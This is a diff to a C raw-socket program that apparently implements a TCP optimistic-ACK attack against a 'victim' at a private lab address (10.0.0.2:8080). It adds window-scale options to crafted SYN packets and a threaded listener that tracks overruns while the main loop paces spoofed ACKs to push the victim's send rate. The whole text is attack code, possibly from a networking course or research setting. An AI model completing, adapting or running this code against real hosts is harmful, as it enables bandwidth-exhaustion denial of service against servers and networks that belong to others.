@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <time.h>
 #include <sys/time.h>
+#include <pthread.h>
 
 //Socket stuff
 #include <sys/socket.h>
@@ -44,6 +45,13 @@ struct victim_connection {
   unsigned overrun_ack;    // stores the ack that was overrun
   unsigned is_done;        // if a fin packet was received, it will be 1
   unsigned short window;         // the current window size
+  pthread_mutex_t lock;     // a mutex lock to sync the two threads
+};
+
+struct pace_args {
+  int socket;
+  struct victim_connection *m_victim;
+  int duration;
 };
 
 double d_max(double a, double b) {
@@ -116,6 +124,7 @@ int send_packet(int socket,
 
     //TCP header + data
     char packet[MSS];
+    int packet_length;
 
     //Address struct to sendto()
     struct sockaddr_in addr_in;
@@ -125,6 +134,7 @@ int send_packet(int socket,
 
     //Pseudo TCP Header + TCP Header + data
     char *pseudo_packet;
+    unsigned *tcpopt;
     char *data;
     //Populate address struct
     addr_in.sin_family = AF_INET;
@@ -133,9 +143,30 @@ int send_packet(int socket,
 
     //Allocate mem for tcp headers and 0
     memset(packet, 0, MSS);
-
     tcpHdr = (struct tcphdr *) packet;
-    data = (char *) (packet + sizeof(struct tcphdr));
+    if (syn) {
+      tcpopt = (unsigned *) (packet + sizeof(struct tcphdr));
+      data = (char *) (packet + sizeof(struct tcphdr) + 32);
+
+      packet_length = sizeof(struct tcphdr) + content_length + 32;
+      // set the wscale option
+      unsigned tcp_wscale_kind = 3;
+      unsigned tcp_wscale_len = 3;
+      unsigned tcp_wscale_shift = wscale;
+
+      unsigned w_scaleopt = ((tcp_wscale_kind << 24) +
+                   (tcp_wscale_len << 16) +
+                   (tcp_wscale_shift << 8));
+
+      *tcpopt = htonl(w_scaleopt);
+
+      tcpHdr->doff = 6;
+    } else {
+      packet_length = sizeof(struct tcphdr) + content_length;
+      data = (char *) (packet + sizeof(struct tcphdr));
+      tcpHdr->doff = 5; //4 bits: 5 x 32-bit words on tcp header
+    }
+    
     memcpy(data, content, content_length);
 
     //Populate tcpHdr
@@ -146,16 +177,15 @@ int send_packet(int socket,
 
     if (is_ack) {
       tcpHdr-> ack = 1;
-      printf("Sending an ack: %u\n", ack_nbr);
+      //printf("Sending an ack: %u\n", ack_nbr);
       tcpHdr->ack_seq = htonl((unsigned)ack_nbr); //32 bit ack sequence number, depends whether ACK is set or not
 
     } else {
-      printf("Not sending an ack %u\n", ack_nbr);
+      //printf("Not sending an ack %u\n", ack_nbr);
       tcpHdr->ack = 0;
       tcpHdr->ack_seq = 0;
     }
 
-    tcpHdr->doff = 5; //4 bits: 5 x 32-bit words on tcp header
     tcpHdr->res1 = 0; //4 bits: Not used
     tcpHdr->cwr = 0; //Congestion control mechanism
     tcpHdr->ece = 0; //Congestion control mechanism
@@ -174,11 +204,11 @@ int send_packet(int socket,
   pTCPPacket.dstAddr = m_connection->dst_addr; //32 bit format of source address
   pTCPPacket.zero = 0; //8 bit always zero
   pTCPPacket.protocol = IPPROTO_TCP; //8 bit TCP protocol
-  pTCPPacket.TCP_len = htons(sizeof(struct tcphdr) + content_length); // 16 bit length of TCP header
+  pTCPPacket.TCP_len = htons(packet_length); // 16 bit length of TCP header
 
   //Populate the pseudo packet
-  pseudo_packet = (char *) malloc((int) (sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + content_length));
-  memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + content_length);
+  pseudo_packet = (char *) malloc((int) (sizeof(struct pseudoTCPPacket) + packet_length));
+  memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + packet_length);
 
   //Copy pseudo header
   memcpy(pseudo_packet, (char *) &pTCPPacket, sizeof(struct pseudoTCPPacket));
@@ -187,19 +217,19 @@ int send_packet(int socket,
   tcpHdr->check = 0;
 
   //Copy tcp header + data to fake TCP header for checksum
-  memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, sizeof(struct tcphdr) + content_length);
+  memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, packet_length);
 
   //Set the TCP header's check field
-  tcpHdr->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) +  content_length)));
+  tcpHdr->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct pseudoTCPPacket) + packet_length)));
 
-  printf("TCP Checksum: %d\n", (int) tcpHdr->check);
+  //printf("TCP Checksum: %d\n", (int) tcpHdr->check);
 
   //Finally, send packet
-  if((bytes_sent = sendto(socket, packet, sizeof(struct tcphdr) + content_length, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {
+  if((bytes_sent = sendto(socket, packet, packet_length, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {
     perror("Error on sendto()");
   }
   else {
-    printf("Success! Sent %d bytes.\n", bytes_sent);
+    //printf("Success! Sent %d bytes.\n", bytes_sent);
   }
 
 
@@ -228,14 +258,14 @@ unsigned read_packet(struct victim_connection *m_victim, int sock) {
 
           struct tcphdr *tcph = (struct tcphdr*)(buff + iphdrlen);
 
-          printf("Incoming packet: \n");
-          printf("Packet size (bytes) %d\n", ntohs(ip_packet->tot_len));
-          printf("Source Address: %s\n", (char *)inet_ntoa(source_socket_address.sin_addr));
-          printf("Destination Address: %s\n", (char *)inet_ntoa(dest_socket_address.sin_addr));
-          printf("Identification: %d\n\n", ntohs(ip_packet->id)); 
+          //printf("Incoming packet: \n");
+          //printf("Packet size (bytes) %d\n", ntohs(ip_packet->tot_len));
+          //printf("Source Address: %s\n", (char *)inet_ntoa(source_socket_address.sin_addr));
+          //printf("Destination Address: %s\n", (char *)inet_ntoa(dest_socket_address.sin_addr));
+          //printf("Identification: %d\n\n", ntohs(ip_packet->id)); 
           return ntohl(tcph->seq);
         } else {
-          printf("Does not match\n");
+          //printf("Does not match\n");
         }
       }
     }
@@ -256,11 +286,11 @@ void handshake(struct victim_connection *m_victim, int sock) {
 				content,content_length,1,fin,rst,0,
 				window,w_scale);
 	unsigned read_seq = read_packet(m_victim, sock);
-  printf("Received packet with sequence num: %u\n", read_seq);
+  //printf("Received packet with sequence num: %u\n", read_seq);
   send_seq +=1;
   ack_nbr = 0;
 	ack_nbr = (long)read_seq+1;
-  printf("Handshake ack_nbr: %u, %ld, %ld",read_seq, ack_nbr, (long) read_seq + 1);
+  //printf("Handshake ack_nbr: %u, %ld, %ld",read_seq, ack_nbr, (long) read_seq + 1);
 	send_packet(sock,m_victim,send_seq,ack_nbr,
 				content,content_length,syn,fin,rst,1,
 				window,w_scale);
@@ -270,6 +300,39 @@ void handshake(struct victim_connection *m_victim, int sock) {
 				content,content_length,syn,fin,rst,1,
 				window,w_scale);
 	m_victim->send_seq = send_seq + content_length;
+
+}
+
+/**
+ *  This method is used by the listening thread to receive packets
+ */
+void *checkOverruns(void *vargp) {
+
+    struct pace_args *m_args = (struct pace_args*) vargp;
+
+    m_args->m_victim->last_received_seq = m_args->m_victim->start_ack;
+
+    struct timeval start_time, current_time;
+    gettimeofday(&start_time, NULL);
+    gettimeofday(&current_time, NULL);
+
+    while (current_time.tv_sec - start_time.tv_sec <= m_args->duration) {
+
+      unsigned read_seq = read_packet(m_args->m_victim, m_args->socket);
+      printf("Received packet in check overruns\n");
+      pthread_mutex_lock(&(m_args->m_victim->lock));
+      if (read_seq == m_args->m_victim->last_received_seq) {
+        printf("This is an overrun\n");
+        m_args->m_victim->had_overrun = 1;
+        m_args->m_victim->overrun_ack = read_seq;
+      } else if (read_seq > m_args->m_victim->last_received_seq) {
+        printf("There is no overrun\n");
+        m_args->m_victim->last_received_seq = read_seq;
+      }
+      pthread_mutex_unlock(&(m_args->m_victim->lock));
+
+      gettimeofday(&current_time, NULL);
+    }
 
 }
 
@@ -291,11 +354,16 @@ int beginAttack(int duration, double target_rate) {
     // Set up each connection struct
     m_victim.id = 2;
     m_victim.dst_addr = inet_addr("10.0.0.2");
-    m_victim.dst_port = 5001;//TODO;
+    m_victim.dst_port = 8080;//TODO;
     m_victim.window = MSS;
     m_victim.had_overrun = 0;
     m_victim.overrun_ack = 0;
     m_victim.is_done = 0;
+
+    if (pthread_mutex_init(&(m_victim.lock), NULL) != 0) {
+        printf("\nFailed to create mutex lock");
+        return 1;
+    }
 
     // Connect to each server using 3-way handshake
     handshake(&m_victim, sock);
@@ -307,6 +375,14 @@ int beginAttack(int duration, double target_rate) {
     // Begin the pace thread to observe overruns
     // TODO
 
+    pthread_t tid;
+    struct pace_args p_args;
+    p_args.socket = sock;
+    p_args.m_victim = &m_victim;
+    p_args.duration = duration;
+
+    pthread_create(&tid, NULL, checkOverruns, (void *) &p_args);
+
     // begin the real attack
 
     struct timeval start_time, current_time;
@@ -316,10 +392,13 @@ int beginAttack(int duration, double target_rate) {
     while (current_time.tv_sec - start_time.tv_sec <= duration) {
       // See if the attack should stop
 
+      pthread_mutex_lock(&(m_victim.lock));
       if (m_victim.had_overrun) {
+        printf("Resetting last sent ack\n");
         m_victim.last_sent_ack = m_victim.overrun_ack;
         m_victim.had_overrun = 0;
       }
+      pthread_mutex_unlock(&(m_victim.lock));
 
       struct timeval before_sent, after_sent;
       gettimeofday(&before_sent, NULL);
@@ -387,6 +466,8 @@ int beginAttack(int duration, double target_rate) {
                 5840,                         // window
                 0);                           // w_scale
 
+    pthread_join(tid, NULL);
+    pthread_mutex_destroy(&(m_victim.lock));
     close(sock);
 }
 
